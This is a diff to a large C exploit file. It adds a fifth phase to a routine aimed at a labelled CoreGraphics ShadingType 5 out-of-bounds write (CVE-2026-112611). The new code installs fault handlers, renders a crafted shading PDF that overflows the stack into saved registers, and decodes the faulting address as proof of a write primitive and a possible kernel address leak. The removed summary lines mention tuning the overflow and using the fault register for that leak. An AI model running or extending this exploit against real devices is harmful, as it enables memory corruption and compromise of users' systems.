@@ -30983,6 +30983,18 @@ static CFDataRef pdf_build_shading_pdf(int vpr, int rows, int nout, int target_i
     return data;
 }
 
+/* Phase 5 signal handler state — file-scoped for C compatibility */
+static volatile sig_atomic_t r508_fault_caught = 0;
+static volatile uint64_t r508_fault_addr = 0;
+static sigjmp_buf r508_jmpbuf;
+
+static void r508_sighandler(int sig, siginfo_t *info, void *uctx) {
+    (void)sig; (void)uctx;
+    r508_fault_addr = (uint64_t)(uintptr_t)info->si_addr;
+    r508_fault_caught = 1;
+    siglongjmp(r508_jmpbuf, 1);
+}
+
 static void r508_exploit(void) {
     rlog("=== CVE-2026-112611: CoreGraphics ShadingType 5 OOB Write ===\n\n");
 
@@ -31158,15 +31170,90 @@ static void r508_exploit(void) {
     rlog("  Phase 4 complete\n\n");
     fflush(stdout);
 
+    /* ---- Phase 5: Stack route with signal handler (reusable primitive) ---- */
+    rlog("--- Phase 5: Stack-route crash with signal handler ---\n");
+    rlog("  Installing SIGSEGV/SIGBUS handler to catch the fault...\n");
+    rlog("  Stack route: VPR=2, R=136, controlled overflow into saved regs\n");
+    fflush(stdout);
+
+    /* Install handler */
+    struct sigaction sa_new, sa_old_segv, sa_old_bus;
+    memset(&sa_new, 0, sizeof(sa_new));
+    sa_new.sa_sigaction = r508_sighandler;
+    sa_new.sa_flags = SA_SIGINFO;
+    sigemptyset(&sa_new.sa_mask);
+    sigaction(SIGSEGV, &sa_new, &sa_old_segv);
+    sigaction(SIGBUS, &sa_new, &sa_old_bus);
+
+    if (sigsetjmp(r508_jmpbuf, 1) == 0) {
+        /* First entry — trigger the stack-route PDF */
+        rlog("  Building stack-route PDF: VPR=2, R=136...\n");
+        fflush(stdout);
+
+        /* Use 0x3FF0000000000000 (1.0) as the fill value — official shape */
+        CFDataRef pdf5_data = pdf_build_shading_pdf(2, 2, 136, -1, 0, 0);
+        rlog("  Stack PDF size: %ld bytes\n", (long)CFDataGetLength(pdf5_data));
+
+        CGDataProviderRef dp5 = CGDataProviderCreateWithCFData(pdf5_data);
+        CGPDFDocumentRef doc5 = CGPDFDocumentCreateWithProvider(dp5);
+        rlog("  CGPDFDocument: %p\n", (void *)doc5);
+
+        if (doc5) {
+            CGPDFPageRef page5 = CGPDFDocumentGetPage(doc5, 1);
+            if (page5) {
+                CGColorSpaceRef cs5 = CGColorSpaceCreateDeviceRGB();
+                uint32_t *pixels5 = (uint32_t *)calloc(256 * 256, 4);
+                CGContextRef ctx5 = CGBitmapContextCreate(pixels5, 256, 256, 8, 256 * 4, cs5,
+                    (CGBitmapInfo)kCGImageAlphaPremultipliedLast);
+
+                rlog("  Rendering stack-route PDF (WILL CRASH — handler should catch)...\n");
+                fflush(stdout);
+
+                CGContextDrawPDFPage(ctx5, page5);
+
+                /* If we get here, the crash didn't happen */
+                rlog("  UNEXPECTED: stack route did NOT crash!\n");
+                CGContextRelease(ctx5);
+                CGColorSpaceRelease(cs5);
+                free(pixels5);
+            }
+            CGPDFDocumentRelease(doc5);
+        }
+        CGDataProviderRelease(dp5);
+        CFRelease(pdf5_data);
+    } else {
+        /* Returned from signal handler via longjmp */
+        rlog("  *** FAULT CAUGHT! Signal handler survived! ***\n");
+        rlog("  Fault address (FAR): 0x%llx\n", (unsigned long long)r508_fault_addr);
+        rlog("  This confirms the write primitive is live and catchable.\n");
+
+        /* Decode what the fault address tells us */
+        if (r508_fault_addr == 0) {
+            rlog("  FAR=0: NULL dereference — overflow zeroed a pointer\n");
+        } else if (r508_fault_addr < 0x100000) {
+            rlog("  FAR=low address: small-offset dereference from zeroed base\n");
+        } else if ((r508_fault_addr & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
+            rlog("  FAR=kernel range: stack contained kernel pointer — KASLR leak possible!\n");
+            rlog("  Leaked kernel address: 0x%llx\n", (unsigned long long)r508_fault_addr);
+        } else {
+            rlog("  FAR=0x%llx: corrupted pointer from overflow values\n",
+                (unsigned long long)r508_fault_addr);
+        }
+    }
+
+    /* Restore original signal handlers */
+    sigaction(SIGSEGV, &sa_old_segv, NULL);
+    sigaction(SIGBUS, &sa_old_bus, NULL);
+
+    rlog("  Phase 5 complete\n\n");
+    fflush(stdout);
+
     rlog("=== SUMMARY ===\n");
-    rlog("  If any phase crashed: vulnerability CONFIRMED on this device\n");
-    rlog("  If all phases survived: the overflow occurred but didn't hit critical state\n");
-    rlog("    - Stack route (Phase 1): may need exact R value tuning\n");
-    rlog("    - Heap route (Phase 2-3): overflow happened but target memory was safe\n");
-    rlog("  Next steps:\n");
-    rlog("    - Add DeviceCMYK variant for ColorSync/CMM splice path\n");
-    rlog("    - Tune R and VPR values based on crash analysis\n");
-    rlog("    - Use crash far register for KASLR leak\n\n");
+    rlog("  Phase 1: SKIPPED (confirmed crash)\n");
+    rlog("  Phase 2: Heap spill VPR=130 R=2000 (survived)\n");
+    rlog("  Phase 3: Heap spill VPR=130 R=9000 marker@1231 (survived)\n");
+    rlog("  Phase 4: DeviceCMYK R=9000 (survived — CMM splice not active in-app)\n");
+    rlog("  Phase 5: Stack route with signal handler (crash recovery test)\n\n");
 
     rlog("=== r508 (CVE-2026-112611) complete ===\n\n");
     fflush(stdout);
